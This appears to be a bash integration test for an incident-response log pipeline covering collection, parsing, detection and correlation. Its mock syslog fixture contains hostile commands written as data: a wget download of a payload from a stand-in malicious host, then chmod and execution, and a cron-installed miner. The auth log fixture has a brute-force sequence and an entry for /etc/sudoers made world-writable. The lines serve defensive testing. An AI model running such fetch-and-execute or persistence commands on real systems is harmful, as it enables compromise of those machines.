#!/bin/bash
#
# Full Pipeline Integration Test
# Tests the entire log processing pipeline from collection to alerting

set -e

# Get the project root directory
IRF_ROOT=$(dirname "$(dirname "$(readlink -f "$0")")")/../..

# Source common functions
source "${IRF_ROOT}/lib/bash/common.sh"

# Create test directory
TEST_DIR=$(mktemp -d)
trap 'rm -rf "$TEST_DIR"' EXIT

echo "Setting up integration test environment"

# Create mock log files
LOGS_DIR="${TEST_DIR}/logs"
mkdir -p "$LOGS_DIR"

# Create a sample auth.log with known patterns that should trigger alerts
cat > "${LOGS_DIR}/auth.log" << EOF
May 20 10:15:30 server1 sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2
May 20 10:15:35 server1 sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2
May 20 10:15:40 server1 sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2
May 20 10:15:45 server1 sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2
May 20 10:15:50 server1 sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2
May 20 10:16:00 server1 sshd[1234]: Accepted password for admin from 192.168.1.100 port 22 ssh2
May 20 11:20:15 server1 sudo[2345]: user1 : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/bin/bash
May 20 12:30:10 server1 chmod[2348]: root changed permissions of /etc/sudoers from 0440 to 0777
EOF

# Create a sample syslog with suspicious activity
cat > "${LOGS_DIR}/syslog.log" << EOF
May 20 14:10:05 server1 bash[3456]: Command executed: wget http://malicious-site.com/payload.sh -O /tmp/payload.sh
May 20 14:10:15 server1 bash[3457]: Command executed: chmod +x /tmp/payload.sh
May 20 14:10:20 server1 bash[3458]: Command executed: /tmp/payload.sh
May 20 14:15:30 server1 crontab[3459]: root edited crontab entry: * * * * * /tmp/miner.sh
EOF

# Set up test environment
export IRF_ROOT="$IRF_ROOT"
export IRF_LOG_DIR="${TEST_DIR}/framework_logs"
export IRF_EVIDENCE_DIR="${TEST_DIR}/evidence"
export IRF_CONF_DIR="${IRF_ROOT}/conf"

# Create necessary directories
mkdir -p "$IRF_LOG_DIR" "$IRF_EVIDENCE_DIR"

# Create a test configuration
mkdir -p "${TEST_DIR}/conf/sources"
cat > "${TEST_DIR}/conf/sources/auth_test.conf" << EOF
LOG_TYPE="auth"
LOG_PRIORITY=10
ENABLED=true
LOG_FILES="${LOGS_DIR}/auth.log"
LOG_FORMAT="syslog"
COLLECTION_METHOD="file"
REAL_TIME_MONITORING=false
POLLING_INTERVAL=60
EOF

cat > "${TEST_DIR}/conf/sources/syslog_test.conf" << EOF
LOG_TYPE="syslog"
LOG_PRIORITY=20
ENABLED=true
LOG_FILES="${LOGS_DIR}/syslog.log"
LOG_FORMAT="syslog"
COLLECTION_METHOD="file"
REAL_TIME_MONITORING=false
POLLING_INTERVAL=60
EOF

# Function to check if a file contains expected patterns
check_file_contains() {
    local file="$1"
    local pattern="$2"
    local description="$3"
    
    if grep -q "$pattern" "$file"; then
        echo "✅ $description: Pattern found"
        return 0
    else
        echo "❌ $description: Pattern not found"
        return 1
    fi
}

# Test Step 1: Collect Logs
echo "Step 1: Testing log collection"
COLLECTED_DIR="${TEST_DIR}/collected"
mkdir -p "$COLLECTED_DIR"

"${IRF_ROOT}/bin/irf" collect --source auth --output "$COLLECTED_DIR" || {
    echo "❌ Log collection failed"
    exit 1
}

# Check that logs were collected
if [ ! -f "${COLLECTED_DIR}/"*"/auth.log" ]; then
    echo "❌ Auth logs were not collected"
    exit 1
else
    echo "✅ Auth logs collected successfully"
fi

# Test Step 2: Parse Logs
echo "Step 2: Testing log parsing"
PARSED_FILE="${TEST_DIR}/parsed_auth.tsv"

"${IRF_ROOT}/bin/irf" parse "${TEST_DIR}/conf/sources/auth_test.conf" "${COLLECTED_DIR}/"*"/auth.log" "$PARSED_FILE" || {
    echo "❌ Log parsing failed"
    exit 1
}

# Check that parsing produced expected output
if [ ! -f "$PARSED_FILE" ]; then
    echo "❌ Parsed output file not created"
    exit 1
else
    echo "✅ Logs parsed successfully"
fi

# Test Step 3: Detect Threats
echo "Step 3: Testing threat detection"
ALERTS_FILE="${TEST_DIR}/alerts.tsv"

"${IRF_ROOT}/bin/irf" detect --input "$PARSED_FILE" --output "$ALERTS_FILE" --rules "${IRF_ROOT}/conf/rules/brute-force.rules" || {
    echo "❌ Threat detection failed"
    exit 1
}

# Check that alerts were generated
if [ ! -f "$ALERTS_FILE" ]; then
    echo "❌ Alerts file not created"
    exit 1
else
    # Check for expected alert patterns
    check_file_contains "$ALERTS_FILE" "Failed password" "Brute force detection"
    echo "✅ Threats detected successfully"
fi

# Test Step 4: Correlate Events
echo "Step 4: Testing event correlation"
CORRELATION_FILE="${TEST_DIR}/correlated.json"

"${IRF_ROOT}/bin/irf" correlate --events "$ALERTS_FILE" --output "$CORRELATION_FILE" --window 3600 || {
    echo "❌ Event correlation failed"
    exit 1
}

# Check correlation results
if [ ! -f "$CORRELATION_FILE" ]; then
    echo "❌ Correlation file not created"
    exit 1
else
    check_file_contains "$CORRELATION_FILE" "correlation" "Event correlation"
    echo "✅ Events correlated successfully"
fi

echo "Full pipeline integration test completed successfully!"
exit 0